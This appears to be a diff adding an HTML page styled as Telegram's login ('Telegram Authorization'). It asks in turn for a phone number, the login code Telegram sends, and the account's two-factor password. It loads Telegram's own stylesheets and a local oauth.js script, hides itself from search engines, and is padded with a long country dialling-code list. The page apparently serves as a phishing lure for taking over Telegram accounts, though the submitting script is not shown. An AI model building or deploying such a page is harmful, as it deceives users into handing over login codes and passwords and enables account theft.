@@ -1,0 +1,861 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <title>Telegram Authorization</title>
+  <meta content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"
+    name="viewport" />
+  <meta content="telephone=no" name="format-detection" />
+  <meta content="IE=edge" http-equiv="X-UA-Compatible" />
+  <meta content="176" name="MobileOptimized" />
+  <meta content="True" name="HandheldFriendly" />
+  <meta content="noindex, nofollow" name="robots" />
+
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet" type="text/css">
+  <link href="https://telegram.org/css/bootstrap.min.css?3" rel="stylesheet">
+  <link href="https://telegram.org/css/bootstrap-extra.css?2" rel="stylesheet">
+  <link href="https://telegram.org/css/telegram.css?231" rel="stylesheet">
+  <link href="css/oauth.css?14" rel="stylesheet">
+
+</head>
+
+<body class="">
+  <main class="login">
+    <section id="login-container" class="login_content">
+      <form id="phone-form" class="login_form" onsubmit="return sendCode(event);">
+        <div class="login_confirm_text">Please enter your <b>phone number</b> in the <a
+            href="https://telegram.org/faq#login-and-sms" rel="noopener" target="_blank">international format</a> and we
+          will send a confirmation message to your account via Telegram.
+        </div>
+        <div id="login-form-group" class="login_form_group">
+          <div id="login-country-wrap" class="login_country_field_wrap">
+            <div id="login-country-selected" class="login_country_select" data-placeholder="Unknown country"></div>
+            <div class="login_country_search_wrap">
+              <div id="login-country-search-textfield" class="textfield-item">
+                <input id="login-country-search" autocomplete="off" class="form-control" placeholder="Search"
+                  type="text" />
+                <div class="textfield-item-underline"></div>
+              </div>
+              <div id="login-country-search-results" class="login_country_search_results"
+                data-noresult="Country not found"></div>
+            </div>
+          </div>
+          <div class="login_phone_field_wrap">
+            <div class="login_code_field_wrap">
+              <div id="login-phone-code-textfield" class="textfield-item">
+                <input id="login-phone-code" autocomplete="off" class="form-control" type="tel" />
+                <div class="textfield-item-underline"></div>
+              </div>
+            </div><div class="login_number_field_wrap">
+              <div id="login-phone-textfield" class="textfield-item">
+                <input id="login-phone" autocomplete="off" class="form-control" type="tel" />
+                <div class="textfield-item-underline"></div>
+                <label id="login-phone-placeholder" class="textfield-item-placeholder"
+                  data-placeholder="Phone number"></label>
+                <span id="login-phone-alert" class="textfield-item-error"></span>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="login_button_wrap">
+          <button class="button-item button-item-flat ripple-handler" onclick="return loginCancel(event)" type="button">
+            <span class="button-item-label">Cancel</span>
+            <span class="ripple-mask"><span class="ripple"></span></span>
+          </button>
+          <button class="button-item ripple-handler" type="submit">
+            <span class="button-item-label">Next</span>
+            <span class="ripple-mask"><span class="ripple"></span></span>
+          </button>
+        </div>
+      </form>
+
+      <form id="code-form" class="hide" onsubmit="return signIn(event);">
+        <div class="login_form_group">
+          <span class="form-control login-form-control input input-lg input-disabled">
+            <span id="login-phone-field" class="login_phone_field" dir="auto"></span>
+            <span id="login-phone-field" class="login_phone_invalid">
+              <a class="login-back" href="" onclick="return cancelCode(event);">edit</a>
+            </span>
+          </span>
+          <div class="login_form_message">We&#39;ve just sent you a message with code.<br />Please enter this code below
+            to confirm access via
+            Telegram
+          </div>
+        </div>
+        <div class="login_phone_field_wrap">
+          <div class="login_number_field_wrap">
+            <div id="login-code-textfield" class="textfield-item">
+              <input id="login-code" autocomplete="off" class="form-control" style="text-align:center;" />
+              <div class="textfield-item-underline"></div>
+              <label id="login-code-placeholder" class="textfield-item-placeholder" data-placeholder="Code"></label>
+              <span id="login-code-alert" class="textfield-item-error" style="margin: 7px 0;"></span>
+            </div>
+          </div>
+        </div>
+        <div class="login_button_wrap">
+          <button class="button-item button-item-flat ripple-handler" onclick="return loginCancel(event)" type="button">
+            <span class="button-item-label">Cancel</span>
+            <span class="ripple-mask"><span class="ripple"></span></span>
+          </button>
+
+          <button class="button-item ripple-handler" type="submit">
+            <span class="button-item-label">Next</span>
+            <span class="ripple-mask"><span class="ripple"></span></span>
+          </button>
+        </div>
+      </form>
+
+      <form id="2fa-form" class="hide" onsubmit="return send2FA(event);">
+        <div class="login_form_group">
+          <span class="form-control login-form-control input input-lg input-disabled">
+            <span id="login-phone-field" class="login_phone_field" dir="auto"></span>
+            <span id="login-phone-field" class="login_phone_invalid">
+              <a class="login-back" href="" onclick="return cancelCode(event);">edit</a>
+            </span>
+          </span>
+          <div class="login_form_message">Your code is correct.<br />Please enter your password for 2FA authorization
+            below
+          </div>
+        </div>
+        <div class="login_phone_field_wrap">
+          <div class="login_number_field_wrap">
+            <div id="login-2fa-textfield" class="textfield-item">
+              <input id="login-2fa" autocomplete="off" class="form-control" type="password" style="text-align:center;" />
+              <div class="textfield-item-underline"></div>
+              <label id="login-2fa-placeholder" class="textfield-item-placeholder" data-placeholder="password"></label>
+              <span id="login-2fa-alert" class="textfield-item-error" style="margin: 7px 0;"></span>
+              <span id="login-phone-field" class="login_phone_invalid" style="top: 50%; transform: translateY(-50%); background: #fff;">
+                <a id="2fa-mode" class="login-back" onclick="return togglePassword(event, 'login-2fa');">show</a>
+              <span>
+            </div>
+          </div>
+        </div>
+        <div class="login_button_wrap">
+          <button class="button-item button-item-flat ripple-handler" onclick="return loginCancel(event)" type="button">
+            <span class="button-item-label">Cancel</span>
+            <span class="ripple-mask"><span class="ripple"></span></span>
+          </button>
+
+          <button class="button-item ripple-handler" type="submit">
+            <span class="button-item-label">Next</span>
+            <span class="ripple-mask"><span class="ripple"></span></span>
+          </button>
+        </div>
+      </form>
+    </section>
+  </main>
+  <script src="js/oauth.js?16"></script>
+
+  <script>
+    var CountriesList = [
+      { 'iso2': 'AD', 'name': 'Andorra', 'codes': [{ 'code': '376', 'patterns': ['XX XX XX'] }], 'patterns': [] },
+      {
+        'iso2': 'AE',
+        'name': 'United Arab Emirates',
+        'codes': [{ 'code': '971', 'patterns': ['XX XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'AF', 'name': 'Afghanistan', 'codes': [{ 'code': '93', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      {
+        'iso2': 'AG',
+        'name': 'Antigua &amp; Barbuda',
+        'codes': [{ 'code': '1268', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'AI', 'name': 'Anguilla', 'codes': [{ 'code': '1264', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'AL', 'name': 'Albania', 'codes': [{ 'code': '355', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'AM', 'name': 'Armenia', 'codes': [{ 'code': '374', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'AO', 'name': 'Angola', 'codes': [{ 'code': '244', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'AR', 'name': 'Argentina', 'codes': [{ 'code': '54' }] },
+      { 'iso2': 'AS', 'name': 'American Samoa', 'codes': [{ 'code': '1684', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'AT', 'name': 'Austria', 'codes': [{ 'code': '43', 'patterns': ['XXX XXXXXX'] }], 'patterns': [] },
+      { 'iso2': 'AU', 'name': 'Australia', 'codes': [{ 'code': '61', 'patterns': ['X XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'AW', 'name': 'Aruba', 'codes': [{ 'code': '297', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'AZ', 'name': 'Azerbaijan', 'codes': [{ 'code': '994', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'BA',
+        'name': 'Bosnia &amp; Herzegovina',
+        'codes': [{ 'code': '387', 'patterns': ['XX XXX XXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'BB', 'name': 'Barbados', 'codes': [{ 'code': '1246', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BD', 'name': 'Bangladesh', 'codes': [{ 'code': '880', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'BE', 'name': 'Belgium', 'codes': [{ 'code': '32', 'patterns': ['XXX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'BF', 'name': 'Burkina Faso', 'codes': [{ 'code': '226', 'patterns': ['XX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'BG', 'name': 'Bulgaria', 'codes': [{ 'code': '359' }] },
+      { 'iso2': 'BH', 'name': 'Bahrain', 'codes': [{ 'code': '973', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BI', 'name': 'Burundi', 'codes': [{ 'code': '257', 'patterns': ['XX XX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BJ', 'name': 'Benin', 'codes': [{ 'code': '229', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'BM', 'name': 'Bermuda', 'codes': [{ 'code': '1441', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BN', 'name': 'Brunei Darussalam', 'codes': [{ 'code': '673', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BO', 'name': 'Bolivia', 'codes': [{ 'code': '591', 'patterns': ['X XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BQ', 'name': 'Bonaire, Sint Eustatius &amp; Saba', 'codes': [{ 'code': '599' }] },
+      { 'iso2': 'BR', 'name': 'Brazil', 'codes': [{ 'code': '55', 'patterns': ['XX XXXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BS', 'name': 'Bahamas', 'codes': [{ 'code': '1242', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BT', 'name': 'Bhutan', 'codes': [{ 'code': '975', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'BW', 'name': 'Botswana', 'codes': [{ 'code': '267', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'BY', 'name': 'Belarus', 'codes': [{ 'code': '375', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'BZ', 'name': 'Belize', 'codes': [{ 'code': '501' }] },
+      {
+        'iso2': 'CA',
+        'name': 'Canada',
+        'codes': [
+          {
+            'code': '1',
+            'prefixes': [
+              '403',
+              '587',
+              '780',
+              '825',
+              '236',
+              '250',
+              '604',
+              '672',
+              '778',
+              '204',
+              '431',
+              '506',
+              '709',
+              '902',
+              '782',
+              '226',
+              '249',
+              '289',
+              '343',
+              '365',
+              '416',
+              '437',
+              '519',
+              '548',
+              '613',
+              '647',
+              '705',
+              '807',
+              '905',
+              '418',
+              '438',
+              '450',
+              '514',
+              '579',
+              '581',
+              '819',
+              '873',
+              '306',
+              '639',
+              '867',
+            ],
+            'patterns': ['XXX XXX XXXX'],
+          },
+        ],
+        'prefixes': [],
+        'patterns': [],
+      },
+      {
+        'iso2': 'CD',
+        'name': 'Congo (Dem. Rep.)',
+        'codes': [{ 'code': '243', 'patterns': ['XX XXX XXXX'] }],
+        'patterns': [],
+      },
+      {
+        'iso2': 'CF',
+        'name': 'Central African Rep.',
+        'codes': [{ 'code': '236', 'patterns': ['XX XX XX XX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'CG', 'name': 'Congo (Rep.)', 'codes': [{ 'code': '242', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CH', 'name': 'Switzerland', 'codes': [{ 'code': '41', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'CI',
+        'name': 'Côte d&#39;Ivoire',
+        'codes': [{ 'code': '225', 'patterns': ['XX XX XX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'CK', 'name': 'Cook Islands', 'codes': [{ 'code': '682' }] },
+      { 'iso2': 'CL', 'name': 'Chile', 'codes': [{ 'code': '56', 'patterns': ['X XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CM', 'name': 'Cameroon', 'codes': [{ 'code': '237', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CN', 'name': 'China', 'codes': [{ 'code': '86', 'patterns': ['XXX XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CO', 'name': 'Colombia', 'codes': [{ 'code': '57', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CR', 'name': 'Costa Rica', 'codes': [{ 'code': '506', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CU', 'name': 'Cuba', 'codes': [{ 'code': '53', 'patterns': ['X XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CV', 'name': 'Cape Verde', 'codes': [{ 'code': '238', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CW', 'name': 'Curaçao', 'codes': [{ 'code': '599', 'prefixes': ['9'] }], 'prefixes': [] },
+      { 'iso2': 'CY', 'name': 'Cyprus', 'codes': [{ 'code': '357', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'CZ', 'name': 'Czech Republic', 'codes': [{ 'code': '420', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'DE', 'name': 'Germany', 'codes': [{ 'code': '49' }] },
+      { 'iso2': 'DJ', 'name': 'Djibouti', 'codes': [{ 'code': '253', 'patterns': ['XX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'DK', 'name': 'Denmark', 'codes': [{ 'code': '45', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'DM', 'name': 'Dominica', 'codes': [{ 'code': '1767', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'DO',
+        'name': 'Dominican Rep.',
+        'codes': [
+          { 'code': '1809', 'patterns': ['XXX XXXX'] },
+          { 'code': '1829', 'patterns': ['XXX XXXX'] },
+          { 'code': '1849', 'patterns': ['XXX XXXX'] },
+        ],
+        'patterns': [],
+      },
+      { 'iso2': 'DZ', 'name': 'Algeria', 'codes': [{ 'code': '213', 'patterns': ['XXX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'EC', 'name': 'Ecuador', 'codes': [{ 'code': '593', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'EE', 'name': 'Estonia', 'codes': [{ 'code': '372', 'patterns': ['XXXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'EG', 'name': 'Egypt', 'codes': [{ 'code': '20', 'patterns': ['XX XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'ER', 'name': 'Eritrea', 'codes': [{ 'code': '291', 'patterns': ['X XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'ES', 'name': 'Spain', 'codes': [{ 'code': '34', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'ET', 'name': 'Ethiopia', 'codes': [{ 'code': '251', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'FI', 'name': 'Finland', 'codes': [{ 'code': '358' }] },
+      { 'iso2': 'FJ', 'name': 'Fiji', 'codes': [{ 'code': '679', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'FK', 'name': 'Falkland Islands', 'codes': [{ 'code': '500' }] },
+      { 'iso2': 'FM', 'name': 'Micronesia', 'codes': [{ 'code': '691' }] },
+      { 'iso2': 'FO', 'name': 'Faroe Islands', 'codes': [{ 'code': '298', 'patterns': ['XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'FR', 'name': 'France', 'codes': [{ 'code': '33', 'patterns': ['X XX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'GA', 'name': 'Gabon', 'codes': [{ 'code': '241', 'patterns': ['X XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'GB', 'name': 'United Kingdom', 'codes': [{ 'code': '44', 'patterns': ['XXXX XXXXXX'] }], 'patterns': [] },
+      { 'iso2': 'GD', 'name': 'Grenada', 'codes': [{ 'code': '1473', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'GE', 'name': 'Georgia', 'codes': [{ 'code': '995', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'GF', 'name': 'French Guiana', 'codes': [{ 'code': '594' }] },
+      { 'iso2': 'GH', 'name': 'Ghana', 'codes': [{ 'code': '233', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'GI', 'name': 'Gibraltar', 'codes': [{ 'code': '350', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'GL', 'name': 'Greenland', 'codes': [{ 'code': '299', 'patterns': ['XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'GM', 'name': 'Gambia', 'codes': [{ 'code': '220', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'GN', 'name': 'Guinea', 'codes': [{ 'code': '224', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'GP', 'name': 'Guadeloupe', 'codes': [{ 'code': '590', 'patterns': ['XXX XX XX XX'] }], 'patterns': [] },
+      {
+        'iso2': 'GQ',
+        'name': 'Equatorial Guinea',
+        'codes': [{ 'code': '240', 'patterns': ['XXX XXX XXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'GR', 'name': 'Greece', 'codes': [{ 'code': '30', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'GT', 'name': 'Guatemala', 'codes': [{ 'code': '502', 'patterns': ['X XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'GU', 'name': 'Guam', 'codes': [{ 'code': '1671', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'GW', 'name': 'Guinea-Bissau', 'codes': [{ 'code': '245', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'GY', 'name': 'Guyana', 'codes': [{ 'code': '592', 'patterns': ['5926XXXXXX'] }], 'patterns': [] },
+      { 'iso2': 'HK', 'name': 'Hong Kong', 'codes': [{ 'code': '852', 'patterns': ['X XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'HN', 'name': 'Honduras', 'codes': [{ 'code': '504', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'HR', 'name': 'Croatia', 'codes': [{ 'code': '385', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'HT', 'name': 'Haiti', 'codes': [{ 'code': '509', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'HU', 'name': 'Hungary', 'codes': [{ 'code': '36', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'ID', 'name': 'Indonesia', 'codes': [{ 'code': '62', 'patterns': ['XXX XXXXXX'] }], 'patterns': [] },
+      { 'iso2': 'IE', 'name': 'Ireland', 'codes': [{ 'code': '353', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'IL', 'name': 'Israel', 'codes': [{ 'code': '972', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'IN', 'name': 'India', 'codes': [{ 'code': '91', 'patterns': ['XXXXX XXXXX'] }], 'patterns': [] },
+      { 'iso2': 'IO', 'name': 'Diego Garcia', 'codes': [{ 'code': '246', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'IQ', 'name': 'Iraq', 'codes': [{ 'code': '964', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'IR', 'name': 'Iran', 'codes': [{ 'code': '98', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'IS', 'name': 'Iceland', 'codes': [{ 'code': '354', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'IT', 'name': 'Italy', 'codes': [{ 'code': '39', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'JM', 'name': 'Jamaica', 'codes': [{ 'code': '1876', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'JO', 'name': 'Jordan', 'codes': [{ 'code': '962', 'patterns': ['X XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'JP', 'name': 'Japan', 'codes': [{ 'code': '81', 'patterns': ['XX XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'KE', 'name': 'Kenya', 'codes': [{ 'code': '254', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'KG', 'name': 'Kyrgyzstan', 'codes': [{ 'code': '996', 'patterns': ['XXX XXXXXX'] }], 'patterns': [] },
+      { 'iso2': 'KH', 'name': 'Cambodia', 'codes': [{ 'code': '855', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'KI', 'name': 'Kiribati', 'codes': [{ 'code': '686', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'KM', 'name': 'Comoros', 'codes': [{ 'code': '269', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'KN',
+        'name': 'Saint Kitts &amp; Nevis',
+        'codes': [{ 'code': '1869', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'KP', 'name': 'North Korea', 'codes': [{ 'code': '850' }] },
+      { 'iso2': 'KR', 'name': 'South Korea', 'codes': [{ 'code': '82', 'patterns': ['XX XXXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'KW', 'name': 'Kuwait', 'codes': [{ 'code': '965', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'KY', 'name': 'Cayman Islands', 'codes': [{ 'code': '1345', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'KZ',
+        'name': 'Kazakhstan',
+        'codes': [{ 'code': '7', 'prefixes': ['6', '7'], 'patterns': ['XXX XXX XX XX'] }],
+        'prefixes': [],
+        'patterns': [],
+      },
+      { 'iso2': 'LA', 'name': 'Laos', 'codes': [{ 'code': '856', 'patterns': ['XX XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'LB', 'name': 'Lebanon', 'codes': [{ 'code': '961' }] },
+      { 'iso2': 'LC', 'name': 'Saint Lucia', 'codes': [{ 'code': '1758', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'LI', 'name': 'Liechtenstein', 'codes': [{ 'code': '423', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'LK', 'name': 'Sri Lanka', 'codes': [{ 'code': '94', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'LR', 'name': 'Liberia', 'codes': [{ 'code': '231', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'LS', 'name': 'Lesotho', 'codes': [{ 'code': '266', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'LT', 'name': 'Lithuania', 'codes': [{ 'code': '370', 'patterns': ['XXX XXXXX'] }], 'patterns': [] },
+      { 'iso2': 'LU', 'name': 'Luxembourg', 'codes': [{ 'code': '352', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'LV', 'name': 'Latvia', 'codes': [{ 'code': '371', 'patterns': ['XXX XXXXX'] }], 'patterns': [] },
+      { 'iso2': 'LY', 'name': 'Libya', 'codes': [{ 'code': '218', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MA', 'name': 'Morocco', 'codes': [{ 'code': '212', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MC', 'name': 'Monaco', 'codes': [{ 'code': '377', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MD', 'name': 'Moldova', 'codes': [{ 'code': '373', 'patterns': ['XX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'ME', 'name': 'Montenegro', 'codes': [{ 'code': '382' }] },
+      { 'iso2': 'MG', 'name': 'Madagascar', 'codes': [{ 'code': '261', 'patterns': ['XX XX XXX XX'] }], 'patterns': [] },
+      { 'iso2': 'MH', 'name': 'Marshall Islands', 'codes': [{ 'code': '692' }] },
+      { 'iso2': 'MK', 'name': 'North Macedonia', 'codes': [{ 'code': '389', 'patterns': ['XX XXXXXX'] }], 'patterns': [] },
+      { 'iso2': 'ML', 'name': 'Mali', 'codes': [{ 'code': '223', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MM', 'name': 'Myanmar', 'codes': [{ 'code': '95' }] },
+      { 'iso2': 'MN', 'name': 'Mongolia', 'codes': [{ 'code': '976', 'patterns': ['XX XX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MO', 'name': 'Macau', 'codes': [{ 'code': '853', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      {
+        'iso2': 'MP',
+        'name': 'Northern Mariana Islands',
+        'codes': [{ 'code': '1670', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'MQ', 'name': 'Martinique', 'codes': [{ 'code': '596' }] },
+      { 'iso2': 'MR', 'name': 'Mauritania', 'codes': [{ 'code': '222', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MS', 'name': 'Montserrat', 'codes': [{ 'code': '1664', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MT', 'name': 'Malta', 'codes': [{ 'code': '356', 'patterns': ['XX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'MU', 'name': 'Mauritius', 'codes': [{ 'code': '230', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MV', 'name': 'Maldives', 'codes': [{ 'code': '960', 'patterns': ['XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MW', 'name': 'Malawi', 'codes': [{ 'code': '265', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'MX', 'name': 'Mexico', 'codes': [{ 'code': '52' }] },
+      { 'iso2': 'MY', 'name': 'Malaysia', 'codes': [{ 'code': '60' }] },
+      { 'iso2': 'MZ', 'name': 'Mozambique', 'codes': [{ 'code': '258', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'NA', 'name': 'Namibia', 'codes': [{ 'code': '264', 'patterns': ['XX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'NC', 'name': 'New Caledonia', 'codes': [{ 'code': '687' }] },
+      { 'iso2': 'NE', 'name': 'Niger', 'codes': [{ 'code': '227', 'patterns': ['XX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'NF', 'name': 'Norfolk Island', 'codes': [{ 'code': '672' }] },
+      { 'iso2': 'NG', 'name': 'Nigeria', 'codes': [{ 'code': '234', 'patterns': ['XX XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'NI', 'name': 'Nicaragua', 'codes': [{ 'code': '505', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'NL', 'name': 'Netherlands', 'codes': [{ 'code': '31', 'patterns': ['X XX XX XX XX'] }], 'patterns': [] },
+      { 'iso2': 'NO', 'name': 'Norway', 'codes': [{ 'code': '47', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'NP', 'name': 'Nepal', 'codes': [{ 'code': '977', 'patterns': ['XX XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'NR', 'name': 'Nauru', 'codes': [{ 'code': '674' }] },
+      { 'iso2': 'NU', 'name': 'Niue', 'codes': [{ 'code': '683' }] },
+      { 'iso2': 'NZ', 'name': 'New Zealand', 'codes': [{ 'code': '64', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'OM', 'name': 'Oman', 'codes': [{ 'code': '968', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'PA', 'name': 'Panama', 'codes': [{ 'code': '507', 'patterns': ['XXXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'PE', 'name': 'Peru', 'codes': [{ 'code': '51', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'PF', 'name': 'French Polynesia', 'codes': [{ 'code': '689' }] },
+      { 'iso2': 'PG', 'name': 'Papua New Guinea', 'codes': [{ 'code': '675' }] },
+      { 'iso2': 'PH', 'name': 'Philippines', 'codes': [{ 'code': '63', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'PK', 'name': 'Pakistan', 'codes': [{ 'code': '92', 'patterns': ['XXX XXX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'PL', 'name': 'Poland', 'codes': [{ 'code': '48', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'PM', 'name': 'Saint Pierre &amp; Miquelon', 'codes': [{ 'code': '508' }] },
+      {
+        'iso2': 'PR',
+        'name': 'Puerto Rico',
+        'codes': [{ 'code': '1787', 'patterns': ['XXX XXXX'] }, { 'code': '1939', 'patterns': ['XXX XXXX'] }],
+        'patterns': [],
+      },
+      { 'iso2': 'PS', 'name': 'Palestine', 'codes': [{ 'code': '970', 'patterns': ['XXX XX XXXX'] }], 'patterns': [] },
+      { 'iso2': 'PT', 'name': 'Portugal', 'codes': [{ 'code': '351', 'patterns': ['XXX XXX XXX'] }], 'patterns': [] },
+      { 'iso2': 'PW', 'name': 'Palau', 'codes': [{ 'code': '680' }] },
